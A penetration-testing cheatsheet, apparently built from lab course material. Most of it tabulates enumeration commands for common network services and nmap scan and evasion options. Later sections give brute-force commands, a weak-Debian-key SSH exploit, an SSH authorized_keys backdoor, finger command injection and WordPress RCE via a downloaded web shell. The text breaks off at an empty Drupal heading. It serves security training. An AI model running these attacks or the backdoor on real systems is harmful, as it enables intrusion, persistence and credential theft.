---
title : Cheatsheet
---

- TOC
{:toc}

# Footprinting

## Infrastructure-based Enumeration

### Domain Information

| **Commands** |  **Description**  |
| --------------|-------------------|
| [crt.sh](https://crt.sh/) | Online subdomain finder |
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency. |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |
| `dig any inlanefreight.com` |  DNS Records |
|[Domain Dossier](https://centralops.net/co/domaindossier.aspx)| Investigate domains and IP Addresses |
|[Shodan](https://shodan.io)| Search engine for Internet-connected devices|
|[SecurityTrails](https://securitytrails.com)| DNS/Historical DNS data|
|[DNSDumpster](https://dnsdumpster.com)| Discover hosts relating to domain|
|[Subdomain Finder](https://subdomainfinder.c99.nl/)| Find subdomains of given domain|
| Google Dorks:  ||
|`site:*.domain.com.au -inurl:www` | Find forth level domain. add additional *. to go beyond|
|```site:"target[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess ```|Dork for fun extensions|
|[Whoxy](https://www.whoxy.com/) | Whois/ReverseWhois (Owner, Keyword, Companyname) |
 

### Cloud Resources

| **Commands** |  **Description**  |
| --------------|-------------------|
|[Hacktricks](https://book.hacktricks.xyz/)|The GOAT resource|
| [Domain.glass](https://domain.glass/) | Third-party providers such as domain.glass can also tell us a lot about the company's infrastructure. |
| Wappalyzer | Extension |
| [Gray](https://buckets.grayhatwarfare.com/) | Another very useful provider is GrayHatWarfare. We can do many different searches, discover AWS, Azure |
|[Builtwith](https://builtwith.com/)| Discover underlying tech on website |

## Host-based Enumeration

### FTP

|**Command**|**Description**|
|-|-|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |
| `get` | To download a file |
| `put` | To upload a file |
| `find / -type f -name ftp* 2>/dev/null \| grep scripts` | Nmap FTP Scripts |

### SMB

|**Command**|**Description**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB and to see available shares |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |
| `samrdump.py 10.129.14.128` | Impacket - Samrdump.py |
| `smbmap -H 10.129.14.128` | Enumerating SMB null session using smbmap |
| `crackmapexec smb 10.129.14.128 --shares -u '' -p ''` | Enumerating SMB null session using cme |
| [Enum4linux](https://github.com/cddmp/enum4linux-ng.git) | This tool automates many of the SMB queries, but not all, and can return a large amount of information. |
| `./enum4linux-ng.py 10.129.14.128 -A` | Enum4Linux-ng - Enumeration |

### NFS

|**Command**|**Description**|
|-|-|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| If nfs mounts as Nobody:Nobody change /etc/idmapd.conf to the following `Nobody-User = kali   Nobody-Group = kali ` then reread config with ` sudo nfsidmap -c` ||
| `umount ./target-NFS` | Unmount the specific NFS share. |
| `sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049` | Nmap nsf scan |
| `mkdir target-NFS` `sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock` `cd target-NFS` | Mounting NFS share |
| `ls -l mnt/nfs/` | List Contents with Usernames & Group Names |
| `ls -n mnt/nfs/` | List Contents with UIDs & GUIDs |
| `cd ..` `sudo umount ./target-NFS` | Unmounting |

### DNS 

|**Command**|**Description**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver / Zone transfer |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |
| `dig soa www.inlanefreight.com` | The SOA record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed. |
| `dig CH TXT version.bind 10.129.120.85` | Sometimes it is also possible to query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server. For this, we could use the following command |
| `for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 \| grep -v ';\|SOA' \| sed -r '/^\s*$/d' \| grep $sub \| tee -a subdomains.txt;done` | Subdomain bruteforcing(command might be wrong bc of md lang use the module) |
| `dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb` | Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example DNSenum. Also we can perform automatic dns enum using this tool |
|See Attacking DNS ||

### SMTP

|**Command**|**Description**|
|-|-|
| `telnet <FQDN/IP> 25` | Connect to the smtp server |
| AUTH PLAIN | AUTH is a service extension used to authenticate the client. |
| HELO | The client logs in with its computer name and thus starts the session. |
| MAIL FROM |	The client names the email sender. |
| RCPT TO |	The client names the email recipient. |
| DATA |	The client initiates the transmission of the email. |
| RSET |	The client aborts the initiated transmission but keeps the connection between client and server. |
| VRFY |	The client checks if a mailbox is available for message transfer. |
| EXPN |	The client also checks if a mailbox is available for messaging with this command. |
| NOOP |	The client requests a response from the server to prevent disconnection due to time-out. |
| QUIT |	The client terminates the session. |
| `sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v` | we can also use the smtp-open-relay NSE script to identify the target SMTP server as an open relay using 16 different tests |


### IMAP / POP3

|**Command**|**Description**|
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |
| `curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd` | Connect to the IMAPS service. |
| **IMAP Commands**|**Description**|
|LOGIN username password|User's login.|
|LIST "" *|Lists all directories.|
|CREATE "INBOX"|Creates a mailbox with a specified name.|
|DELETE "INBOX"|Deletes a mailbox.|
|RENAME "ToRead" "Important"|Renames a mailbox.|
|LSUB "" *|Returns a subset of names from the set of names that the User has declared as being active or subscribed.|
|SELECT INBOX|Selects a mailbox so that messages in the mailbox can be accessed.|
|UNSELECT INBOX|Exits the selected mailbox.|
|FETCH <ID> all|Retrieves data associated with a message in the mailbox.|
|CLOSE|Removes all messages with the Deleted flag set.|
|LOGOUT|Closes the connection with the IMAP server.|
|**POP3 Commands**|**Description**|
|USER username|Identifies the user.|
|PASS password|Authentication of the user using its password.|
|STAT|Requests the number of saved emails from the server.|
|LIST|Requests from the server the number and size of all emails.|
|RETR id|Requests the server to deliver the requested email by ID.|
|DELE id|Requests the server to delete the requested email by ID.|
|CAPA|Requests the server to display the server capabilities.|
|RSET|Requests the server to reset the transmitted information.|
|QUIT|Closes the connection with the POP3 server.|

### SNMP

|**Command**|**Description**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |

### MySQL

|**Command**|**Description**|
|-|-|
| `sudo nmap 10.129.14.128 -sVC -p3306 --script mysql*` | Scanning MySQL Server |
| `mysql -u root -pP4SSw0rd -h 10.129.14.128` | Interaction with the MySQL Server |

### MSSQL

|**Command**|**Description**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |
|`auxiliary/scanner/mssql/mssql_ping` | MSFconsole module returns info on pingable database such as hostname, Version, port etc.|
| `locate mssqlclient.py` | Locate mssqlclient.py |
| `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248` | NMAP MSSQL Script Scan |

### Oracle TNS

Script to install tools for enumeration of Oracle TNS instance
 ```
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
sudo submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
python3 -m pip install cx_Oracle --upgrade --user
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

| **Command**                                                                                       | **Description**                                                                               |
|---------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------|
| `sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute`                            | nmap SID Bruteforce                                                                          |
| `./odat all -s <IP>`                                                                              | Python tool to enumerate/gather information about Oracle database services and components.   |
| SQLPlus                                                                                           |                                                                                               |
| `sqlplus <USERNAME>/<PASSWORD>@<IP>/<SID>;`                                                      | Logon to the database using gathered credentials and SID                                    |
| ODAT file upload                                                                                  |                                                                                               |
| `echo "Oracle File Upload Test" > testing.txt`                                                    |                                                                                               |
| `./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot\\testing.txt ./testing.txt` |                                                                                               |



### IPMI

|**Command**|**Description**|
|-|-|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |
| `sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local` | Nmap |
| `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` | crack HP iLO using a factory default password|

### SSH

|**Command**|**Description**|
|-|-|
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |
| `sudo nmap -sV -p 873 127.0.0.1` | Scanning for Rsync |
| `nc -nv 127.0.0.1 873` | Probing for Accessible Shares |
| `rsync -av --list-only rsync://127.0.0.1/dev` | Enumerating an Open Share |

### Windows Remote Management

|**Command**|**Description**|
|-|-|
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

_____

# Information Gathering - Web Edition

### WHOIS

| **Command** | **Description** |
|-|-|
| `export TARGET="domain.tld"` | Assign target to an environment variable. |
| `whois $TARGET` | WHOIS lookup for the target. |

### DNS Enumeration

| **Command** | **Description** |
|-|-|
| `nslookup $TARGET` | Identify the `A` record for the target domain. |
| `nslookup -query=A $TARGET` | Identify the `A` record for the target domain. |
| `dig $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `dig a $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `nslookup -query=PTR <IP>` | Identify the `PTR` record for the target IP address. |
| `dig -x <IP> @<nameserver/IP>` | Identify the `PTR` record for the target IP address.  |
| `nslookup -query=ANY $TARGET` | Identify `ANY` records for the target domain. |
| `dig any $TARGET @<nameserver/IP>` | Identify `ANY` records for the target domain. |
| `nslookup -query=TXT $TARGET` | Identify the `TXT` records for the target domain. |
| `dig txt $TARGET @<nameserver/IP>` | Identify the `TXT` records for the target domain. |
| `nslookup -query=MX $TARGET` | Identify the `MX` records for the target domain. |
| `dig mx $TARGET @<nameserver/IP>` | Identify the `MX` records for the target domain. |
| `whois $TARGET` | WHOIS lookup for the target. |

### Passive Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| [VirusTotal](https://www.virustotal.com/gui/home/url) | VirusTotal maintains its DNS replication service, which is developed by preserving DNS resolutions made when users visit URLs given by them. |
| [Censys](https://censys.io/) | CT logs to discover additional domain names and subdomains for a target organization |
| [Crt.sh](https://crt.sh/) | CT logs to discover additional domain names and subdomains for a target organization |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u` | All subdomains for a given domain. |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u` | All TLDs found for a given domain. |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u` | All results across all TLDs for a given domain. |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup on IP address. |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup of a CIDR range. |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency. |
| `cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done` | Searching for subdomains and other information on the sources provided in the source.txt list. |
| `head/tail -n20 facebook.com_crt.sh.txt` | To view the top/bottom 20 lines from a file |
| [TheHarvester](https://github.com/laramies/theHarvester) | The tool collects emails, names, subdomains, IP addresses, and URLs from various public data sources for passive information gathering. For now, we will use the following modules |

#### Sources.txt
```txt
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```

### Passive Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `Netcraft` | [https://www.netcraft.com/](https://www.netcraft.com/) |
| `WayBackMachine` | [http://web.archive.org/](http://web.archive.org/) |
| `WayBackURLs` | [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) |
| `waybackurls -dates https://$TARGET > waybackurls.txt` | Crawling URLs from a domain with the date it was obtained. |

### Active Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `curl -I "http://${TARGET}"` | Display HTTP headers of the target webserver. |
| `whatweb -a https://www.facebook.com -v` | Technology identification. |
| `Wappalyzer` | [https://www.wappalyzer.com/](https://www.wappalyzer.com/) |
| `wafw00f -v https://$TARGET` | WAF Fingerprinting. |
| `Aquatone` | [https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone) |
| `cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000` | Makes screenshots of all subdomains in the subdomain.list. |

### Active Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `HackerTarget` | [https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/) |
| `SecLists` | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| `nslookup -type=any -query=AXFR $TARGET nameserver.target.domain` | Zone Transfer using Nslookup against the target domain and its nameserver. |
| `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"` | Bruteforcing subdomains. |

### Virtual Hosts

| **Resource/Command** | **Description** |
|-|-|
|Recommend seclist for wordlist when bruteforcing /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt| |
| `curl -s http://192.168.10.10 -H "Host: randomtarget.com"` | Changing the HOST HTTP header to request a specific domain. |
| `cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done` | Bruteforcing for possible virtual hosts on the target domain. |
| `ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612` | Bruteforcing for possible virtual hosts on the target domain using `ffuf`. |
|`ffuf -w /path/to/wordlist.txt:FUZZ -u http://FUZZ.example.com`|Bruteforcing for vhost using ffuf alternative|
|`gobuster vhost -w /path/to/wordlist.txt -u http://example.com --append-domain` |Gobuster bruteforce, --append-domain needed to search for higher level domain. E.G LIST.example.com|

### Crawling

| **Resource/Command** | **Description** |
|-|-|
|[https://www.zaproxy.org/](https://www.zaproxy.org/) | Zap|
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | Discovering files and folders that cannot be spotted by browsing the website.|
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS` | Mutated bruteforcing against the target web server. |

## Web Enumeration

| **Command**   | **Description**   |
|-|-|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | List details about the webserver/certificates |
| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |
| `ctrl+U` | View page source (in Firefox) |

------
# Service/Application Specific 

## NMAP

| **State** | 	**Description** |
|-|-|
| open |	This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations. |
| closed |	When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not. |
| filtered | Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.|
| unfiltered |	This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.|
| open/filtered |	If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port. |
| closed/filtered |	This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall. |

### TCP 

```
sudo -sS -sCV -oA <NAME>.tcp <IP> -v
```

### UDP

```
sudo -sU -sS -sCV -oA <NAME>.udp <IP> -v
```
### Scanning Options

| **Nmap Option** | **Description** |
|---|----|
| `10.10.10.0/24` | Target network range. |
| `-sn` | Disables port scanning. |
| `-Pn` | Disables ICMP Echo Requests |
| `-n` | Disables DNS Resolution. |
| `-PE` | Performs the ping scan by using ICMP Echo Requests against the target. |
| `--packet-trace` | Shows all packets sent and received. |
| `--reason` | Displays the reason for a specific result. |
| `--disable-arp-ping` | Disables ARP Ping Requests. |
| `--top-ports=<num>` | Scans the specified top ports that have been defined as most frequent.  |
| `-p-` | Scan all ports. |
| `-p22-110` | Scan all ports between 22 and 110. |
| `-p22,25` | Scans only the specified ports 22 and 25. |
| `-F` | Scans top 100 ports. |
| `-sS` | Performs an TCP SYN-Scan. |
| `-sA` | Performs an TCP ACK-Scan. |
| `-sU` | Performs an UDP Scan. |
| `-sV` | Scans the discovered services for their versions. |
| `-sC` | Perform a Script Scan with scripts that are categorized as "default". |
| `--script <script>` | Performs a Script Scan by using the specified scripts. |
| `-O` | Performs an OS Detection Scan to determine the OS of the target. |
| `-A` | Performs OS Detection, Service Detection, and traceroute scans. |
| `-D RND:5` | Sets the number of random Decoys that will be used to scan the target. |
| `-e` | Specifies the network interface that is used for the scan. |
| `-S 10.10.10.200` | Specifies the source IP address for the scan. |
| `-g` | Specifies the source port for the scan. |
| `--dns-server <ns>` | DNS resolution is performed by using a specified name server. |

### Output Options

| **Nmap Option** | **Description** |
|---|----|
| `-oA filename` | Stores the results in all available formats starting with the name of "filename". |
| `-oN filename` | Stores the results in normal format with the name "filename". |
| `-oG filename` | Stores the results in "grepable" format with the name of "filename". |
| `-oX filename` | Stores the results in XML format with the name of "filename". |

### Performance Options

| **Nmap Option** | **Description** |
|---|----|
| `--max-retries <num>` | Sets the number of retries for scans of specific ports. |
| `--stats-every=5s` | Displays scan's status every 5 seconds. |
| `-v/-vv` | Displays verbose output during the scan. |
| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout. |
| `--max-rtt-timeout 100ms` | Sets the specified time value as maximum RTT timeout. |
| `--min-rate 300` | Sets the number of packets that will be sent simultaneously. |
| `-T <0-5>` | Specifies the specific timing template. |

### Unique Commands

| **Command**   | **Description**   |
| --------------|-------------------|
| `sudo nmap 10.129.2.0/24 -sn -oA tnet \| grep for \| cut -d" " -f5` | Scan Network Range in a subnet / Ping sweep using nmap |
| **Firewall and IDS/IPS Evasion Using NMAP** | |
| `sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5` | Scan by Using Decoys |
| `sudo nmap 10.129.2.28 -n -Pn -p445 -O` | Testing Firewall Rule |
| `sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0` | Scan by Using Different Source IP |
| `sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53` | DNS Proxying / SYN-Scan From DNS Port |
| `ncat -nv --source-port 53 10.129.2.28 50000` | Connect To The Filtered Port |
| `nmap -sL 172.16.7.60` | Get hostname of a host |



------
## AUTORECON
### General use
```
sudo autorecon <HOST> --nmap-append sVC --heartbeat 10 --dirbuster.tool gobuster --dirbuster.wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --dirbuster.ext txt,html,php,sh,asp,aspx,jsp -v
#nmap-append adds to default without changing. 
#sVC Version and default scripts 
#heartbeat - update rate (s)
#dirbuster.tol Sets tool to gobuster
#dirbuster.wordlist sets Wordlist for fuzz
#dirbuster.ext extensions to search for
```
------
## FTP - 21

### Brute force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
```

### Downloading file

```
ftp <IP>
PASSIVE
BINARY
get <FILE>
```

### Uploading file

```
ftp <IP>
PASSIVE
BINARY
put <FILE>
```

|**Command**|**Description**|
|-|-|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |
| `get` | To download a file |
| `put` | To upload a file |
| `find / -type f -name ftp* 2>/dev/null \| grep scripts` | Nmap FTP Scripts |

### Attacking FTP

|**Command**|**Description**|
|-|-|
| `ftp 192.168.2.142` | Connecting to the FTP server using the `ftp` client. |
| `nc -v 192.168.2.142 21` | Connecting to the FTP server using `netcat`. |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | Brute-forcing the FTP service. |
| `medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp` | Brute Forcing with Medusa |
| `nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2` | The Nmap -b flag can be used to perform an FTP bounce attack|

------

## SSH - 22

### Brute force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```

### CVE-2008-0166

```
All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

https://www.exploit-db.com/exploits/5720

wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2

bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
tar -xvf debian_ssh_dsa_1024_x86.tar

python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
```

### SSH backdoor - post exploitation

```
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
```

------
## SMTP

|**Command**|**Description**|
|-|-|
| `telnet <FQDN/IP> 25` | Connect to the smtp server |
| AUTH PLAIN | AUTH is a service extension used to authenticate the client. |
| HELO | The client logs in with its computer name and thus starts the session. |
| MAIL FROM |	The client names the email sender. |
| RCPT TO |	The client names the email recipient. |
| DATA |	The client initiates the transmission of the email. |
| RSET |	The client aborts the initiated transmission but keeps the connection between client and server. |
| VRFY |	The client checks if a mailbox is available for message transfer. |
| EXPN |	The client also checks if a mailbox is available for messaging with this command. |
| NOOP |	The client requests a response from the server to prevent disconnection due to time-out. |
| QUIT |	The client terminates the session. |
| `sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v` | we can also use the smtp-open-relay NSE script to identify the target SMTP server as an open relay using 16 different tests |
|Auto enumeration||
| `Metasploit auxiliary/scanner/smtp/smtp_enum  `| Metersploit module for enumeration|
|`smtp-user-enum -M <MODE> -u <USER_FILE> -t <IP>`| Modes are above. VRFY can be used to bruteforce users| 
|`nmap --script smtp-enum-users <IP>` |nmap script for enumeration of users.  |

### Useful Commands 

|**Command**|**Description**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |

-----
## DNS - 53

|**Command**|**Description**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver / Zone transfer |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |
| `dig soa www.inlanefreight.com` | The SOA record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed. |
| `dig CH TXT version.bind 10.129.120.85` | Sometimes it is also possible to query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server. For this, we could use the following command |
| `for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 \| grep -v ';\|SOA' \| sed -r '/^\s*$/d' \| grep $sub \| tee -a subdomains.txt;done` | Subdomain bruteforcing(command might be wrong bc of md lang use the module) |
| `dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb` | Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example DNSenum. Also we can perform automatic dns enum using this tool |

```
dnsenum <DOMAIN>
```

```
dnsrecon -d <DOMAIN>
```

### Zone transfert

```
dnsrecon -d <DOMAIN> -a
dig axfr <DOMAIN> @ns1.test.com
```

### DNS brute force

```
https://github.com/blark/aiodnsbrute
```
### Attacking DNS

|**Command**|**Description**|
|-|-|
| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` | Perform an AXFR zone transfer attempt against a specific name server. |
| `fierce --domain zonetransfer.me` | Tools like Fierce can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer |
| `subfinder -d inlanefreight.com -v` | Brute-forcing subdomains. |
| `./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt` | An excellent alternative is a tool called Subbrute. This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access. |
| `host support.inlanefreight.com` | DNS lookup for the specified subdomain. |

------

## FINGER - 79

### User enumeration

```
finger @<IP>
finger <USER>@<IP>
```

### Command execution

```
finger "|/bin/id@<IP>"
finger "|/bin/ls -a /<IP>"
```

------

## HTTP - HTTPS - 80 - 443

### Automatic scanners

```
nikto -h <URL>
python crawleet.py -u <URL> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20
```

### Wordpress

```
# Scan
wpscan --rua -e --url <URL>

# Brute force user(s)
wpscan --rua --url <URL> -P <PASSWORDS_LIST> -U "<USER>,<USER>"
```

#### Wordpress panel RCE

```
Modifying a php from the theme used (admin credentials needed)

Appearance -> Editor -> 404 Template (at the right)
Change the content for a php shell
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
http://<IP>/wp-content/themes/twentytwelve/404.php
```

#### Wordpress Priv Esc - Elementor lite 

```
https://github.com/RandomRobbieBF/CVE-2023-32243
Able to reset admin password of site via vuln.  verify version at 

/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt

```
### Drupal

```
